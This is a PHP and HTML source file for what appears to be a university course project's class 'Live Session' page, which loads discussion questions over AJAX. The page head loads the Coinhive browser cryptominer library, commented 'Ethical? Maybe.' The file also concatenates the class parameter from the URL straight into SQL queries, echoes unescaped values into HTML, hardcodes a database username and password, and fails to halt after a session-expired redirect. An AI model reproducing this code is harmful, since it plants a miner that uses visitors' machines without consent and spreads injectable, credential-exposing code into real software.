<?php
  session_start();
  //Check if user is logged in
  if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
    if(($_SESSION['role'] != 4) && $_SESSION['role'] != 3) {
      $_SESSION['error'] = true;
      $_SESSION['errorCode'] = "Not Permitted";
      header("Location: ../login.php");
      die("oops");
    }
  } else {
    $_SESSION['error'] = true;
    $_SESSION['errorCode'] = "Session Expired";
    header("Location: ../login.php?event=logout");
  }

  //TODO Grab all this from a file
  //Define sql database information
  $host="mysql.cs.iastate.edu";
  $port=3306;
  $socket="";
  $user="dbu309sab3";
  $password="SD0wFGqd";
  $dbname="db309sab3";
  //Connect to database
  $db = new mysqli($host, $user, $password, $dbname, $port, $socket) or die ('Could not connect to the database server' . mysqli_connect_error());

  //Get this class
  $query = "SELECT * FROM classes WHERE ID = " . $_GET['class'];
  $result = $db->query($query) or die($db->error);
  $class = $result->fetch_assoc();

  //Check to see if student is actually in this class
  $belongs = false;
  $query = "SELECT class_id FROM userClasses WHERE user_id = " . $_SESSION['id'];
  $result = $db->query($query) or die($db->error);
  while ($class = $result->fetch_assoc()) {
    if($_GET['class'] == $class['class_id']) {
      //user is in this class
      $belongs = true;
      break;
    }
  }
  if(!$belongs) {
    //user is not in this class
    header("Location: home.php");
    die("You shall not pass");
  }

?>

<html lang="en">
  <head>
    <link rel="stylesheet" href="../css/pages.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <link rel="stylesheet" href="css/pages.css">
    <script>
      var feed = 0;

      //Script to get question

      function createQ() {
        var div = document.createElement("div");
        div.innerHTML = "hey there." + counter;
        counter++;
        //Set this question to where it belongs
        document.getElementById('test').appendChild(div);
        document.getElementById('test').innerHTML = "No.";
      }

      </script>
      <script id="source" language="javascript" type="text/javascript">
         function getData(){
           //Get the GET variables
           var $_GET=[];
           window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,function(a,name,value){$_GET[name]=value;});
           //Send reuest to php page for information
           $.ajax({
                 type: "GET",
                 url: 'utilities/liveSession.php',
                 dataType: "json",
                 data: {class: $_GET['class']},
                 success: function(data){
                   var counter = 0;
                   while(data[counter]) {
                     var div = document.createElement("div");
                     div.setAttribute('class', 'row');
                     div.setAttribute('id', data[counter]);
                     feed = data[counter];
                     div.innerHTML = "<div class=\"col-md-12\"><div class=\"jumbotron well\">" + data[counter + 1] + ": " + data[counter + 2] + "</div></div>";
                     counter += 3;
                     document.getElementById('questions').appendChild(div);
                   }
                 },
                 error: function() {
                   alert("Error.");
                 }
             });

             var out = document.getElementById("main");
             var isScrolledToBottom = out.scrollHeight - out.clientHeight <= out.scrollTop + 1;
             if(isScrolledToBottom)
                    out.scrollTop = out.scrollHeight - out.clientHeight;
           };
       </script>
    <!-- End questionable content -->

    <!-- The top banner of the webpage -->
    <div class="top">
        <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
        <center>
          <?php
            echo '<h1>' . $class['class_name'] . '</h1>';
          ?>
        </center>
    </div>
  </head>

  <!-- The left sidebar -->
  <div class="left">
    <?php
      echo '<button class="button" onclick="window.location=\'home.php\';">' . $_SESSION['name'] . '\'s Home</button>';
      echo '<button class="button" onclick="window.location=\'pages.php?class=' . $_GET['class'] . '\';">' . $class['class_name'] . ' Home</button>';
      echo '<button class="button" onclick="window.location=\'topics.php?class=' . $_GET['class'] . '\';">Discussion Topics</button>';
      echo '<button class="button" onclick="window.location=\'liveSession.php?class=' . $_GET['class'] . '\';">Live Session</button>';
     ?>
  </div>

  <!-- Main content of the webpage -->
  <div id="main" class="main">
    <div id="questions" class="container-fluid" style="overflow-y: auto;max-height: 90vh;">
     <div id="text" class="row">
       <button onclick="getData();">Click Here</button>
     </div>
   </div>
  </div>
</html>
